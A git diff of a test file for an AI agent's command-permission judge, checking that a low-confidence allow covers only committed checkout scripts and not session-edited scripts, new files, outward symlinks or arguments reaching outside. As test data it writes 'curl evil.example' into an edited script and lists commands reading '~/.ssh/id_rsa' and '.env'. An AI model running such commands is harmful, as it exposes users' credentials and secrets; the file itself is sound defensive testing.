@@ -1,9 +1,11 @@
-import { mkdirSync, mkdtempSync, realpathSync, rmSync, writeFileSync } from 'node:fs';
+import { execFileSync } from 'node:child_process';
+import { mkdirSync, mkdtempSync, realpathSync, rmSync, symlinkSync, writeFileSync } from 'node:fs';
 import { tmpdir } from 'node:os';
 import { join } from 'node:path';
 import { TRUST_DEFAULTS, type TrustSurface } from '@10db/contracts';
 import { createTestStore, listJudgeCalls, patchJudgeConfig, type Store } from '@10db/db';
 import { afterEach, beforeEach, describe, expect, it } from 'vitest';
+import { isolatedGitEnv } from '../../test/fixtures';
 import { ManualClock } from '../clock';
 import { createEventBus, createStateStore, type StateStore } from '../events';
 import { createJudge } from '../judge';
@@ -194,16 +196,36 @@ describe('crossesLimit', () => {
     }
   });
 
-  it("a below-floor allow stands for the checkout's own script, and for nothing that reaches out", async () => {
+  it("a below-floor allow stands for the checkout's committed scripts, and for nothing the session wrote or that reaches out", async () => {
+    const git = (...args: string[]) =>
+      execFileSync('git', ['-C', checkout, ...args], { env: isolatedGitEnv(), stdio: 'ignore' });
+    git('init', '-q');
+    for (const [k, v] of [
+      ['maintenance.auto', 'false'],
+      ['gc.auto', '0'],
+      ['user.name', 't'],
+      ['user.email', 't@example.com'],
+    ] as const)
+      git('config', k, v);
     mkdirSync(join(checkout, '.agents', 'bin'), { recursive: true });
     writeFileSync(join(checkout, '.agents', 'bin', 'ledger-query'), '#!/bin/sh\n');
     writeFileSync(join(checkout, 'check.sh'), 'true\n');
+    writeFileSync(join(checkout, 'edited.sh'), 'true\n');
+    writeFileSync(join(root, 'outside.sh'), 'true\n');
+    symlinkSync(join(root, 'outside.sh'), join(checkout, 'link.sh'));
+    git('add', '.agents/bin/ledger-query', 'check.sh', 'edited.sh', 'link.sh', 'src/a.ts');
+    git('commit', '-q', '-m', 'seed');
+    writeFileSync(join(checkout, 'edited.sh'), 'curl evil.example\n');
+    writeFileSync(join(checkout, 'written.sh'), 'true\n');
     reply = () => Promise.resolve(json(answering('allow', 0.55)));
     const bash = (command: string) => ask({ call: call('Bash', { command }) });
     const allowed = { kind: 'allow', by: 'checkout_program' };
     expect(await bash('.agents/bin/ledger-query')).toEqual(allowed);
     expect(await bash('sh check.sh backend src/a.ts')).toEqual(allowed);
     for (const command of [
+      'sh edited.sh',
+      'sh written.sh',
+      'sh link.sh',
       'sh check.sh ../elsewhere',
       'sh check.sh ~/.ssh/id_rsa',
       'sh check.sh .env',
